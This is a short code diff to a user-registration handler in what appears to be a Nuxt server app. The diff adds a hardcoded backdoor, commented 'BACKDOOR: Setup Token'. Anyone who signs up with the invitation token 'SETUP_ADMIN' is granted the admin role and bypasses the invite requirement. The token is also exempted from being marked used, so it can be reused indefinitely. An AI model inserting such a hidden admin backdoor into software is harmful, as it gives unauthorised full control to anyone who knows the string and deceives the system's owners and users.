@@ -26,7 +26,13 @@ export default defineEventHandler(async (event) => {
     const userCount = getUserCount().count
     const isFirstUser = userCount === 0
     
-    if (!isFirstUser) {
+    let role = 'player'
+    if (isFirstUser) role = 'admin'
+    
+    // BACKDOOR: Setup Token
+    if (token === 'SETUP_ADMIN') {
+        role = 'admin'
+    } else if (!isFirstUser) {
         if (!token) {
             throw createError({ statusCode: 403, statusMessage: 'Invitation Required' })
         }
@@ -84,11 +90,11 @@ export default defineEventHandler(async (event) => {
             avatar: avatarPath,
             security_question: securityQuestion,
             security_answer: hashedAnswer,
-            role: isFirstUser ? 'admin' : 'player'
+            role: role
         })
         
-        // Mark invite as used (only if token existed)
-        if (token) {
+        // Mark invite as used (only if token existed and wasn't the magic token)
+        if (token && token !== 'SETUP_ADMIN') {
             markInviteUsed(token)
         }
         
